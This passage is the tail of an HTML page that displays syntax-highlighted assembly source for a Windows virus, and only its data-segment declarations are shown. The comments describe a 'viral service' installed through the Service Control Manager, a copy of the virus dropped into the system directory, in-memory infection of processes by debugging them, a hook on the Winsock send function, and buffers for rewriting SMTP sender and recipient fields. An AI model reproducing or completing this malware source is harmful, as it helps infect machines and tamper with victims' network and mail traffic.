</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Handle to Service Control Manager</span><span class="sc0">

</span><span class="sc5">hSCM</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Handle over viral service</span><span class="sc0">

</span><span class="sc5">hViralService</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Service table entry structure used by</span><span class="sc0">
                </span><span class="sc1">;StartServiceCtrlDispatcherA</span><span class="sc0">

</span><span class="sc5">ServiceTable</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00000000h</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc1">;Name of viral service</span><span class="sc0">

</span><span class="sc5">ViralServiceName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000010h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;This is used to locate system DLL files and</span><span class="sc0">
                </span><span class="sc1">;load them without using names, only by means</span><span class="sc0">
                </span><span class="sc1">;of CRC32</span><span class="sc0">

</span><span class="sc5">a_SDLL_CRC32</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">Path_SearchSystemDLL</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">h_Find</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">Win32FindData</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">SIZEOF_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Used to check current computer name</span><span class="sc0">

</span><span class="sc5">SizeOfComputerName</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">szComputerName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc1">;Used to drop virus on Windows system </span><span class="sc0">
                </span><span class="sc1">;directory</span><span class="sc0">

</span><span class="sc5">Path_VirusSystemFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc1">;Used to get current module path + filename             </span><span class="sc0">

</span><span class="sc5">Path_VirusCurrentFile</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc1">;Structure used by GetVersionExA</span><span class="sc0">

</span><span class="sc5">system_version</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">dwOSVersionInfoSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwMajorVersion</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwMinorVersion</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwBuildNumber</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwPlatformId</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">szCSDVersion</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">VER_PLATFORM_WIN32s</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">VER_PLATFORM_WIN32_WINDOWS</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">VER_PLATFORM_WIN32_NT</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Used to find process by window</span><span class="sc0">
                
</span><span class="sc5">ClassName</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">pi_hProcess</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">pi_hThread</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">pi_dwProcessId</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">pi_dwThreadId</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">SIZEOF_PROCESS_INFORMATION</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0">

</span><span class="sc5">STARTUPINFO</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Virus thread used to debug host</span><span class="sc0">

</span><span class="sc5">DebugThreadID</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Process infected *in-memory*</span><span class="sc0">

</span><span class="sc5">TargetProcessID</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TargetThreadID</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Handle over target process</span><span class="sc0">

</span><span class="sc5">hTargetProcess</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Pointer to DLL PE header</span><span class="sc0">

</span><span class="sc5">Buffer__lfanew</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Copy of DLL file header</span><span class="sc0">

</span><span class="sc5">Buffer__FileHeader</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0"> 

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;WSOCK32 hook on send api... This is will</span><span class="sc0">
                </span><span class="sc1">;hold 1st byte of api code              </span><span class="sc0">

</span><span class="sc5">SizeOfBreakpointAndRet04</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">

</span><span class="sc5">Org1Byte__send</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">SizeOfBreakpointAndRet04</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;The virus uses this buffer to keep the</span><span class="sc0">
                </span><span class="sc1">;ThreadID/ThreadHandle pairs of each thread</span><span class="sc0">
                </span><span class="sc1">;in the process debugged</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;As the process being debugged creates and</span><span class="sc0">
                </span><span class="sc1">;destroys new threads, the linked list grows</span><span class="sc0">
                </span><span class="sc1">;or reduces its size</span><span class="sc0">

</span><span class="sc5">VirusProcessThreadList</span><span class="sc0">      </span><span class="sc9">struc</span><span class="sc0">

</span><span class="sc5">VPTL_ThreadId</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">VPTL_hThread</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">VirusProcessThreadList</span><span class="sc0">      </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">SIZEOF_VIRUSPROCESSTHREADLIST</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">VirusProcessThreadList</span><span class="sc0">

</span><span class="sc5">MAX_NUMBER_OF_THREADS</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">ProcessThreadList</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">SIZEOF_VIRUSPROCESSTHREADLIST</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0">  \
                   </span><span class="sc5">MAX_NUMBER_OF_THREADS</span><span class="sc0">        \
                   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00000000h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;DEBUG_EVENT structure</span><span class="sc0">

</span><span class="sc5">DebugEventInfo</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">DEI_DebugEventCode</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">DEI_ProcessId</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">DEI_ThreadId</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">DEI_Info</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000064h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">SIZEOF_SEND_PARAMS</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000014h</span><span class="sc0">

</span><span class="sc5">Buffer_send_Params</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">SIZEOF_SEND_PARAMS</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">SizeOfContext</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">CONTEXT</span><span class="sc0">

                </span><span class="sc9">align</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">

</span><span class="sc5">ThreadContext</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">SizeOfContext</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">hDupSocket</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">TargetStatus</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">SizeOf__MAIL_FROM</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">SizeOf__RCPT_TO</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">e__MAIL_FROM</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">e__RCPT_TO</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SIZEOF_MANIPULATE_BUFFER</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000100h</span><span class="sc0">

</span><span class="sc5">ManipulateBuffer</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">SIZEOF_MANIPULATE_BUFFER</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">WSAData</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000190h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">FIONREAD_param</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">Buffer_rcv</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">_DATA</span><span class="sc0">               </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;########################################################################################################################################################</span><span class="sc0">

                </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">HostCode</span><span class="sc0">

</span></div></body>
</html>
